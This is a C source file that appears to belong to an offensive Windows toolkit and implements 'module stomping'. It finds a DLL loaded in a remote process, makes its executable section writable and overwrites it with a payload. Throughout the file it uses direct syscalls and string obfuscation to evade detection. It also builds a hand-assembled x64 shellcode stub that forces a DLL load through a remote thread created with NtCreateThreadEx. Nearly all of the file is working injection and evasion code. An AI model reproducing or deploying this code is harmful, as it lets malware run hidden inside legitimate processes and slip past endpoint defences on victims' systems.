/**
 * module_stomp.c - Write payload into a legitimately loaded DLL's .text section
 */
#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include "../../include/module_stomp.h"
#include "../../include/obfuscate.h"
#include "../../include/syscalls.h"

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

typedef struct _UNICODE_STRING_MS {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_MS;

typedef NTSTATUS(NTAPI *pLdrLoadDll)(PWCHAR, ULONG, UNICODE_STRING_MS *, PHANDLE);

static FARPROC resolve_nt_func(const char *name) {
    HMODULE ntdll = GetModuleHandleA(OBF("ntdll.dll"));
    if (!ntdll)
        return NULL;
    return GetProcAddress(ntdll, name);
}

BOOL module_stomp_system32_path(const char *dll_name, wchar_t *out, DWORD out_chars) {
    wchar_t sysdir[MAX_PATH] = {0};
    wchar_t wname[MAX_PATH] = {0};
    DWORD need;

    if (!dll_name || !out || out_chars < 16)
        return FALSE;
    if (!GetSystemDirectoryW(sysdir, MAX_PATH))
        return FALSE;
    if (MultiByteToWideChar(CP_ACP, 0, dll_name, -1, wname, MAX_PATH) == 0)
        return FALSE;

    need = lstrlenW(sysdir) + 1 + lstrlenW(wname) + 1;
    if (need > out_chars)
        return FALSE;

    lstrcpyW(out, sysdir);
    lstrcatW(out, L"\\");
    lstrcatW(out, wname);
    return TRUE;
}

BOOL remote_find_module(HANDLE proc, const char *module_name, HMODULE *out_mod) {
    HMODULE mods[1024];
    DWORD needed = 0;

    if (!proc || !module_name || !out_mod)
        return FALSE;

    if (!EnumProcessModulesEx(proc, mods, sizeof(mods), &needed, LIST_MODULES_ALL))
        return FALSE;

    DWORD count = needed / sizeof(HMODULE);
    char name[MAX_PATH];

    for (DWORD i = 0; i < count; i++) {
        if (!GetModuleBaseNameA(proc, mods[i], name, sizeof(name)))
            continue;
        if (_stricmp(name, module_name) == 0) {
            *out_mod = mods[i];
            return TRUE;
        }
    }
    return FALSE;
}

BOOL find_remote_text_section(HANDLE proc, HMODULE mod, PVOID *text_addr, DWORD *text_size) {
    MODULEINFO mi = {0};
    IMAGE_DOS_HEADER dos = {0};
    IMAGE_NT_HEADERS nt = {0};
    IMAGE_SECTION_HEADER sections[16];
    SIZE_T rd = 0;
    WORD num_sections;

    if (!proc || !mod || !text_addr || !text_size)
        return FALSE;

    if (!GetModuleInformation(proc, mod, &mi, sizeof(mi)))
        return FALSE;

    if (sys_NtReadVirtualMemory(proc, mi.lpBaseOfDll, &dos, sizeof(dos), &rd) != 0 ||
        rd != sizeof(dos) || dos.e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    if (sys_NtReadVirtualMemory(proc, (PBYTE)mi.lpBaseOfDll + dos.e_lfanew,
                                &nt, sizeof(nt), &rd) != 0 ||
        rd != sizeof(nt) || nt.Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    num_sections = nt.FileHeader.NumberOfSections;
    if (num_sections > 16)
        num_sections = 16;

    if (sys_NtReadVirtualMemory(proc,
                                (PBYTE)mi.lpBaseOfDll + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS),
                                sections, num_sections * sizeof(IMAGE_SECTION_HEADER), &rd) != 0)
        return FALSE;

    for (WORD i = 0; i < num_sections; i++) {
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *text_addr = (PVOID)((PBYTE)mi.lpBaseOfDll + sections[i].VirtualAddress);
            *text_size = sections[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL stomp_text_section(HANDLE proc, PVOID text_addr, DWORD text_size,
                        const BYTE *data, DWORD data_size) {
    ULONG old_prot = 0;
    SIZE_T prot_sz;
    PVOID prot_base;
    SIZE_T written = 0;

    if (!proc || !text_addr || !data || data_size == 0 || text_size < data_size)
        return FALSE;

    prot_base = text_addr;
    prot_sz = text_size;
    if (sys_NtProtectVirtualMemory(proc, &prot_base, &prot_sz, PAGE_READWRITE, &old_prot) != 0)
        return FALSE;

    if (sys_NtWriteVirtualMemory(proc, text_addr, (PVOID)data, data_size, &written) != 0 ||
        written != data_size)
        return FALSE;

    prot_base = text_addr;
    prot_sz = text_size;
    if (sys_NtProtectVirtualMemory(proc, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot) != 0)
        return FALSE;

    return TRUE;
}

static SIZE_T build_ldr_loader_stub(BYTE *out, SIZE_T cap, UINT64 ldr_addr,
                                    UINT64 unicode_addr, UINT64 handle_addr) {
    /*
     * sub rsp, 0x28
     * xor ecx, ecx
     * xor edx, edx
     * mov r8, unicode_addr
     * mov r9, handle_addr
     * mov rax, ldr_addr
     * call rax
     * add rsp, 0x28
     * ret
     */
    SIZE_T pos = 0;
    if (cap < 64)
        return 0;

    out[pos++] = 0x48; out[pos++] = 0x83; out[pos++] = 0xEC; out[pos++] = 0x28;
    out[pos++] = 0x31; out[pos++] = 0xC9;
    out[pos++] = 0x31; out[pos++] = 0xD2;
    out[pos++] = 0x49; out[pos++] = 0xB8;
    CopyMemory(out + pos, &unicode_addr, sizeof(UINT64));
    pos += sizeof(UINT64);
    out[pos++] = 0x49; out[pos++] = 0xB9;
    CopyMemory(out + pos, &handle_addr, sizeof(UINT64));
    pos += sizeof(UINT64);
    out[pos++] = 0x48; out[pos++] = 0xB8;
    CopyMemory(out + pos, &ldr_addr, sizeof(UINT64));
    pos += sizeof(UINT64);
    out[pos++] = 0xFF; out[pos++] = 0xD0;
    out[pos++] = 0x48; out[pos++] = 0x83; out[pos++] = 0xC4; out[pos++] = 0x28;
    out[pos++] = 0xC3;
    return pos;
}

BOOL remote_load_dll(HANDLE proc, const wchar_t *dll_path, HMODULE *out_mod) {
    pLdrLoadDll LdrLoadDllFn;
    SIZE_T path_bytes;
    PVOID remote_path = NULL;
    PVOID remote_unicode = NULL;
    PVOID remote_handle = NULL;
    PVOID remote_stub = NULL;
    SIZE_T alloc_sz;
    SIZE_T stub_len;
    SIZE_T written = 0;
    HANDLE hThread = NULL;
    HANDLE remote_mod = NULL;
    UNICODE_STRING_MS us_local;
    BYTE stub[96];
    BOOL ok = FALSE;

    if (!proc || !dll_path)
        return FALSE;

    LdrLoadDllFn = (pLdrLoadDll)resolve_nt_func(OBF("LdrLoadDll"));
    if (!LdrLoadDllFn)
        return FALSE;

    path_bytes = (lstrlenW(dll_path) + 1) * sizeof(wchar_t);

    alloc_sz = path_bytes;
    if (sys_NtAllocateVirtualMemory(proc, &remote_path, &alloc_sz,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0)
        return FALSE;

    alloc_sz = sizeof(UNICODE_STRING_MS);
    if (sys_NtAllocateVirtualMemory(proc, &remote_unicode, &alloc_sz,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0)
        goto cleanup;

    alloc_sz = sizeof(HANDLE);
    if (sys_NtAllocateVirtualMemory(proc, &remote_handle, &alloc_sz,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0)
        goto cleanup;

    us_local.Length = (USHORT)(path_bytes - sizeof(wchar_t));
    us_local.MaximumLength = (USHORT)path_bytes;
    us_local.Buffer = (PWSTR)remote_path;

    if (sys_NtWriteVirtualMemory(proc, remote_path, (PVOID)dll_path,
                                 path_bytes, &written) != 0 || written != path_bytes)
        goto cleanup;

    if (sys_NtWriteVirtualMemory(proc, remote_unicode, &us_local,
                                 sizeof(us_local), &written) != 0)
        goto cleanup;

    if (sys_NtWriteVirtualMemory(proc, (PBYTE)remote_unicode + offsetof(UNICODE_STRING_MS, Buffer),
                                 &remote_path, sizeof(PVOID), &written) != 0)
        goto cleanup;

    stub_len = build_ldr_loader_stub(stub, sizeof(stub),
                                     (UINT64)(ULONG_PTR)LdrLoadDllFn,
                                     (UINT64)(ULONG_PTR)remote_unicode,
                                     (UINT64)(ULONG_PTR)remote_handle);
    if (stub_len == 0)
        goto cleanup;

    alloc_sz = stub_len;
    if (sys_NtAllocateVirtualMemory(proc, &remote_stub, &alloc_sz,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ) != 0)
        goto cleanup;

    if (sys_NtWriteVirtualMemory(proc, remote_stub, stub, stub_len, &written) != 0)
        goto cleanup;

    if (sys_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, proc,
                             remote_stub, NULL, 0, 0, 0, 0, NULL) != 0)
        goto cleanup;

    WaitForSingleObject(hThread, 30000);
    CloseHandle(hThread);
    hThread = NULL;

    if (sys_NtReadVirtualMemory(proc, remote_handle, &remote_mod,
                                sizeof(remote_mod), &written) != 0 || !remote_mod)
        goto cleanup;

    if (out_mod)
        *out_mod = (HMODULE)remote_mod;
    ok = TRUE;

cleanup:
    if (hThread)
        CloseHandle(hThread);
    return ok;
}
